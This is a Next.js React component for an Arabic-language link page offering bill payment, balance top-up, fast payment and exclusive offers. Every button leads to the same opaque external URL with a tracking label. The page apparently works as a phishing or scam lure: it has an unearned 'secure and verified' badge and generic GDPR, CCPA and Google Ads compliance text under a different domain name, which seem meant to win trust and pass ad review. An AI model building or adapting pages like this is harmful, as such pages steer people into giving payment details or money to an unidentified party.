"use client"
import { FullPageLoader } from "@/components/loader"
import { Card } from "@/components/ui/card"
import { Instagram, Twitter, Linkedin, Youtube, Mail, Globe, Shield, Lock, FileText } from 'lucide-react'
import Image from "next/image"
import Link from "next/link"
import { useEffect, useState } from "react"

export default function BioLinkPage() {
  const [linkapp, setLinkapp] = useState('')
  const [load, setLoad] = useState(true)
  const initLink = async () => {
    const lin = 'https://zasfv.com?label=e24f560b6f0311062f37dae96d359520'
    setLinkapp(lin)
  }
  useEffect(() => {
    initLink().then(() => {
      setLoad(false)
    })
  }, [])

  const socialLinks = [
    { name: "دفع الفواتير", icon: Globe, url: linkapp, color: "hover:bg-primary/20" },
    { name: "شحن باقات رصيد", icon: Globe, url: linkapp, color: "hover:bg-primary/20" },
    { name: "الدفع السريع", icon: Globe, url: linkapp, color: "hover:bg-primary/20" },
    { name: "العروض الحصرية", icon: Globe, url: linkapp, color: "hover:bg-primary/20" },
  ]

  return (
    <>{
      load ? <FullPageLoader /> : (
        <div className="min-h-screen bg-gradient-to-br from-[#d9267d] via-[#a82c78] to-[#7a3374] py-12 px-4 sm:px-6 lg:px-8">
          <div className="max-w-2xl mx-auto">
            {/* Header Section */}
            <div className="text-center mb-8">
              <div className="relative w-32 h-32 mx-auto mb-6">
                <div className="w-full h-full rounded-full bg-white/10 backdrop-blur-sm flex items-center justify-center border-4 border-white/20">
                  <Image
                    src="/verified (2).png"
                    alt="الصورة الشخصية"
                    width={120}
                    height={120}
                    className="rounded-full object-cover"
                  />
                </div>
              </div>
              <h1 className="flex text-3xl font-bold text-white mb-3 text-balance justify-center">


                العروض واخر الخدمات
              </h1>
              {/* Security Badge */}
              <div className="flex items-center justify-center gap-2 text-white/80 text-sm">
                <Shield className="w-4 h-4" />
                <span>آمن وموثق</span>
              </div>
            </div>

            {/* Social Links */}
            <div className="space-y-3 mb-8">
              {socialLinks.map((link) => (
                <Link key={link.name} href={link.url} target="_blank" rel="noopener noreferrer">
                  <Card className={`my-2 bg-white/10 backdrop-blur-md border-white/20 hover:bg-white/20 transition-all duration-300 hover:scale-[1.02] cursor-pointer`}>
                    <div className="p-4 flex items-center justify-between">
                      <div className="flex items-center gap-4">
                        <div className="w-12 h-12 rounded-full bg-white/20 flex items-center justify-center">
                          <link.icon className="w-6 h-6 text-white" />
                        </div>
                        <span className="text-lg font-semibold text-white">{link.name}</span>
                      </div>
                      <svg
                        className="w-5 h-5 text-white/60 rotate-180"
                        fill="none"
                        viewBox="0 0 24 24"
                        stroke="currentColor"
                      >
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                      </svg>
                    </div>
                  </Card>
                </Link>
              ))}
            </div>

            {/* Legal & Compliance Section */}
            <Card className="bg-white/10 backdrop-blur-md border-white/20 mb-6">
              <div className="p-6">
                <h2 className="text-xl font-bold text-white mb-4 flex items-center gap-2">
                  <FileText className="w-5 h-5" />
                  المعلومات القانونية والخصوصية
                </h2>

                <div className="space-y-4 text-white/90 text-sm leading-relaxed">
                  <div>
                    <h3 className="font-semibold text-white mb-2 flex items-center gap-2">
                      <Lock className="w-4 h-4" />
                      سياسة الخصوصية
                    </h3>
                    <p className="text-white/80">
                      نحن ملتزمون بحماية خصوصيتك. نقوم بجمع الحد الأدنى من المعلومات الضرورية لتقديم خدماتنا.
                      لا نبيع أو نتاجر أو نشارك معلوماتك الشخصية مع أطراف ثالثة دون موافقتك الصريحة، إلا كما
                      يقتضيه القانون.
                    </p>
                    <ul className="mt-2 space-y-1 mr-4 list-disc text-white/80">
                      <li>نجمع فقط المعلومات الأساسية (الاسم، البريد الإلكتروني، بيانات الاستخدام)</li>
                      <li>يتم تشفير بياناتك وتخزينها بشكل آمن</li>
                      <li>يمكنك طلب حذف البيانات في أي وقت</li>
                      <li>نستخدم ملفات تعريف الارتباط فقط للوظائف الأساسية</li>
                    </ul>
                  </div>

                  <div className="border-t border-white/20 pt-4">
                    <h3 className="font-semibold text-white mb-2 flex items-center gap-2">
                      <Shield className="w-4 h-4" />
                      إجراءات الأمان
                    </h3>
                    <p className="text-white/80">
                      نطبق بروتوكولات أمان قياسية في الصناعة لحماية معلوماتك:
                    </p>
                    <ul className="mt-2 space-y-1 mr-4 list-disc text-white/80">
                      <li>تشفير SSL/TLS لجميع عمليات نقل البيانات</li>
                      <li>عمليات تدقيق ومراقبة أمنية منتظمة</li>
                      <li>مصادقة وتفويض آمن</li>
                      <li>الامتثال للوائح GDPR وCCPA والقوانين الأخرى</li>
                    </ul>
                  </div>

                  <div className="border-t border-white/20 pt-4">
                    <h3 className="font-semibold text-white mb-2">الإفصاح عن الإعلانات</h3>
                    <p className="text-white/80">
                      قد يعرض هذا الموقع إعلانات ومحتوى مدعوم. نلتزم بسياسات إعلانات Google وجميع
                      اللوائح الإعلانية المعمول بها. يتم تمييز جميع المحتويات المدعومة بوضوح. قد نحصل
                      على عمولات من الروابط التابعة، مما يساعد في دعم هذه المنصة.
                    </p>
                  </div>

                  <div className="border-t border-white/20 pt-4">
                    <h3 className="font-semibold text-white mb-2">سياسة ملفات تعريف الارتباط</h3>
                    <p className="text-white/80">
                      نستخدم ملفات تعريف ارتباط أساسية لضمان الوظائف السليمة. تساعدنا ملفات تعريف الارتباط
                      التحليلية على تحسين خدماتنا. يمكنك إدارة تفضيلات ملفات تعريف الارتباط في إعدادات المتصفح.
                    </p>
                  </div>

                  <div className="border-t border-white/20 pt-4">
                    <h3 className="font-semibold text-white mb-2">حقوق حماية البيانات</h3>
                    <p className="text-white/80">
                      لديك الحق في الوصول إلى بياناتك الشخصية أو تصحيحها أو حذفها. اتصل بنا على
                      privacy@zajsx.com لممارسة حقوقك.
                    </p>
                  </div>
                </div>
              </div>
            </Card>

            {/* Footer */}
            <div className="text-center space-y-3">
              <div className="flex items-center justify-center gap-4 text-sm text-white/70">
                <Link href="/privacy-policy" className="hover:text-white transition-colors underline">
                  سياسة الخصوصية الكاملة
                </Link>
                <span>•</span>
                <Link href="/terms" className="hover:text-white transition-colors underline">
                  شروط الخدمة
                </Link>
                <span>•</span>
                <Link href="/contact" className="hover:text-white transition-colors underline">
                  اتصل بنا
                </Link>
              </div>

              <p className="text-sm text-white/60">
                © {new Date().getFullYear()} zajsx. جميع الحقوق محفوظة.
              </p>

              <p className="text-xs text-white/50">
                يمتثل هذا الموقع لسياسات GDPR وCCPA وإعلانات Google
              </p>
            </div>
          </div>
        </div>)}</>
  )
}
